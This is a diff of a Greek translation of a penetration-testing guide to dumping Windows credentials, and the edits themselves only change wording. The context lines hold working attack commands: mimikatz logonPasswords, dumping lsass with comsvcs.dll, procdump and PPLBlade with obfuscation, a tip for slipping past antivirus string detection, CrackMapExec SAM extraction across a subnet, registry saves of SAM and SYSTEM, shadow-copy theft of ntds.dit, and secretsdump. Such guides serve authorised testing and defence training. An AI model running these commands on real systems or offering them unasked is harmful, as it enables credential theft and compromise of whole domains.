@@ -67,13 +67,13 @@ mimikatz # sekurlsa::logonPasswords
 ```
 Αυτή η διαδικασία γίνεται αυτόματα με το [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Σημείωση**: Ορισμένα **AV** μπορεί να **ανιχνεύσουν** ως **κακόβουλο** τη χρήση του **procdump.exe για την εξαγωγή του lsass.exe**, αυτό συμβαίνει επειδή **ανιχνεύουν** τη συμβολοσειρά **"procdump.exe" και "lsass.exe"**. Έτσι, είναι **πιο διακριτικό** να **περάσετε** ως **όρισμα** το **PID** του lsass.exe στο procdump **αντί για** το **όνομα lsass.exe.**
+**Σημείωση**: Ορισμένα **AV** μπορεί να **ανιχνεύσουν** ως **κακόβουλο** τη χρήση του **procdump.exe για την εξαγωγή του lsass.exe**, αυτό συμβαίνει επειδή **ανιχνεύουν** τη συμβολοσειρά **"procdump.exe" και "lsass.exe"**. Έτσι, είναι **πιο διακριτικό** να **περάσετε** ως **όρισμα** το **PID** του lsass.exe στο procdump **αντί** για το **όνομα lsass.exe.**
 
 ### Εξαγωγή του lsass με το **comsvcs.dll**
 
 Ένα DLL με το όνομα **comsvcs.dll** που βρίσκεται στο `C:\Windows\System32` είναι υπεύθυνο για την **εξαγωγή της μνήμης διεργασίας** σε περίπτωση κρασάρισματος. Αυτό το DLL περιλαμβάνει μια **λειτουργία** με το όνομα **`MiniDumpW`**, σχεδιασμένη να καλείται χρησιμοποιώντας το `rundll32.exe`.\
-Δεν είναι σχετικό να χρησιμοποιηθούν τα πρώτα δύο ορίσματα, αλλά το τρίτο χωρίζεται σε τρία μέρη. Το ID της διεργασίας που θα εξάγεται αποτελεί το πρώτο μέρος, η τοποθεσία του αρχείου εξαγωγής αντιπροσωπεύει το δεύτερο, και το τρίτο μέρος είναι αυστηρά η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
-Αφού αναλυθούν αυτά τα τρία μέρη, το DLL εμπλέκεται στη δημιουργία του αρχείου εξαγωγής και στη μεταφορά της μνήμης της καθορισμένης διεργασίας σε αυτό το αρχείο.\
+Δεν είναι σχετικό να χρησιμοποιηθούν τα πρώτα δύο ορίσματα, αλλά το τρίτο χωρίζεται σε τρία συστατικά. Το ID διεργασίας που θα εξάγεται αποτελεί το πρώτο συστατικό, η τοποθεσία του αρχείου εξαγωγής αντιπροσωπεύει το δεύτερο, και το τρίτο συστατικό είναι αυστηρά η λέξη **full**. Δεν υπάρχουν εναλλακτικές επιλογές.\
+Αφού αναλυθούν αυτά τα τρία συστατικά, το DLL εμπλέκεται στη δημιουργία του αρχείου εξαγωγής και στη μεταφορά της μνήμης της καθορισμένης διεργασίας σε αυτό το αρχείο.\
 Η χρήση του **comsvcs.dll** είναι εφικτή για την εξαγωγή της διεργασίας lsass, εξαλείφοντας την ανάγκη να ανεβάσετε και να εκτελέσετε το procdump. Αυτή η μέθοδος περιγράφεται λεπτομερώς στο [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
 Η ακόλουθη εντολή χρησιμοποιείται για την εκτέλεση:
@@ -87,11 +87,11 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 1. Κάντε δεξί κλικ στη Γραμμή Εργασιών και επιλέξτε Διαχειριστής Εργασιών
 2. Κάντε κλικ σε Περισσότερες λεπτομέρειες
 3. Αναζητήστε τη διαδικασία "Local Security Authority Process" στην καρτέλα Διαδικασίες
-4. Κάντε δεξί κλικ στη διαδικασία "Local Security Authority Process" και επιλέξτε "Δημιουργία αρχείου dump".
+4. Κάντε δεξί κλικ στη διαδικασία "Local Security Authority Process" και επιλέξτε "Create dump file".
 
 ### Dumping lsass με το procdump
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα υπογεγραμμένο δυαδικό αρχείο της Microsoft που είναι μέρος της σουίτας [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) είναι ένα υπογεγραμμένο δυαδικό αρχείο της Microsoft που είναι μέρος της [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) σουίτας.
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
@@ -110,7 +110,7 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 ```
 ## CrackMapExec
 
-### Εκχύλιση των SAM hashes
+### Εξαγωγή SAM hashes
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
@@ -143,7 +143,7 @@ reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-**Κατεβάστε** αυτά τα αρχεία στη μηχανή Kali σας και **εξαγάγετε τους κατακερματισμούς** χρησιμοποιώντας:
+**Κατεβάστε** αυτά τα αρχεία στον υπολογιστή Kali σας και **εξαγάγετε τους κατακερματισμούς** χρησιμοποιώντας:
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
@@ -167,7 +167,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Αλλά μπορείτε να κάνετε το ίδιο από το **Powershell**. Αυτό είναι ένα παράδειγμα **του πώς να αντιγράψετε το αρχείο SAM** (ο σκληρός δίσκος που χρησιμοποιείται είναι "C:" και αποθηκεύεται στο C:\users\Public) αλλά μπορείτε να το χρησιμοποιήσετε για να αντιγράψετε οποιοδήποτε προστατευμένο αρχείο:
+Αλλά μπορείτε να κάνετε το ίδιο από **Powershell**. Αυτό είναι ένα παράδειγμα **του πώς να αντιγράψετε το αρχείο SAM** (ο σκληρός δίσκος που χρησιμοποιείται είναι "C:" και αποθηκεύεται στο C:\users\Public) αλλά μπορείτε να το χρησιμοποιήσετε για να αντιγράψετε οποιοδήποτε προστατευμένο αρχείο:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -216,7 +216,7 @@ ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 
 ### **Εξαγωγή κατακερματισμών από το NTDS.dit**
 
-Μόλις έχετε **αποκτήσει** τα αρχεία **NTDS.dit** και **SYSTEM**, μπορείτε να χρησιμοποιήσετε εργαλεία όπως το _secretsdump.py_ για να **εξάγετε τους κατακερματισμούς**:
+Μόλις έχετε **obtained** τα αρχεία **NTDS.dit** και **SYSTEM**, μπορείτε να χρησιμοποιήσετε εργαλεία όπως το _secretsdump.py_ για να **extract the hashes**:
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
